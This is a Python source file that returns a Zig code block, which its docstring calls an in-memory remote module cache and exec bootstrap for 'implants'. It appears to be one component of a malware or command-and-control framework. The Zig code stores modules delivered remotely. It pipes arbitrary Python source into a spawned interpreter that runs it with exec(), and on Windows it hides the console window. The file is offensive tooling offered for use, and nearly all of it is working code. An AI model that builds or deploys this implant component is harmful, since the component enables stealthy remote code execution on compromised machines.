#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""In-memory remote module cache and Python exec bootstrap for Zig implants."""

from __future__ import annotations

ZIG_MEMIMPORTER_BLOCK = r'''
const ModEntry = struct {
    path: []u8,
    content: []u8,
};

var g_mod_entries: std.ArrayList(ModEntry) = .empty;
var g_mod_cache_ready = false;

fn modCachePut(allocator: mem.Allocator, path: []const u8, content: []const u8) !void {
    if (!g_mod_cache_ready) {
        g_mod_entries = std.ArrayList(ModEntry).empty;
        g_mod_cache_ready = true;
    }
    for (g_mod_entries.items) |*entry| {
        if (mem.eql(u8, entry.path, path)) {
            allocator.free(entry.content);
            entry.content = try allocator.dupe(u8, content);
            return;
        }
    }
    try g_mod_entries.append(allocator, .{
        .path = try allocator.dupe(u8, path),
        .content = try allocator.dupe(u8, content),
    });
}

fn modCacheGet(allocator: mem.Allocator, path: []const u8) ?[]const u8 {
    _ = allocator;
    if (!g_mod_cache_ready) return null;
    for (g_mod_entries.items) |entry| {
        if (mem.eql(u8, entry.path, path)) return entry.content;
    }
    return null;
}

const _kitty_py_mem_boot =
    \\import sys
    \\src = sys.stdin.read()
    \\ns = {"__name__": "__main__", "__file__": "<remote>"}
    \\exec(compile(src, "<remote>", "exec"), ns)
    \\run_fn = ns.get("run")
    \\if callable(run_fn):
    \\    out = run_fn()
    \\    if out is not None:
    \\        print(out)
    \\else:
    \\    print("OK loaded %d symbols" % len(ns))
;

fn execPythonModuleInMemory(allocator: mem.Allocator, source: []const u8) ![]u8 {
    const argv = if (builtin.os.tag == .windows)
        [_][]const u8{ "python", "-u", "-c", _kitty_py_mem_boot }
    else
        [_][]const u8{ "python3", "-u", "-c", _kitty_py_mem_boot };

    var child = process.Child.init(&argv, allocator);
    child.stdin_behavior = .Pipe;
    child.stdout_behavior = .Pipe;
    child.stderr_behavior = .Pipe;
    if (builtin.os.tag == .windows) child.create_no_window = true;
    try child.spawn();

    if (child.stdin) |stdin| {
        try stdin.writeAll(source);
        stdin.close();
    }

    var out: std.ArrayList(u8) = .empty;
    errdefer out.deinit(allocator);
    var errb: std.ArrayList(u8) = .empty;
    defer errb.deinit(allocator);
    try child.collectOutput(allocator, &out, &errb, 4 * 1024 * 1024);
    _ = child.wait() catch {};

    if (out.items.len == 0 and errb.items.len > 0) {
        return try std.fmt.allocPrint(allocator, "ERROR:{s}", .{errb.items});
    }
    if (errb.items.len > 0) {
        try out.appendSlice(allocator, errb.items);
    }
    if (out.items.len == 0) return try allocator.dupe(u8, "OK");
    return try out.toOwnedSlice(allocator);
}
'''.strip()


def build_zig_memimporter_block() -> str:
    return ZIG_MEMIMPORTER_BLOCK
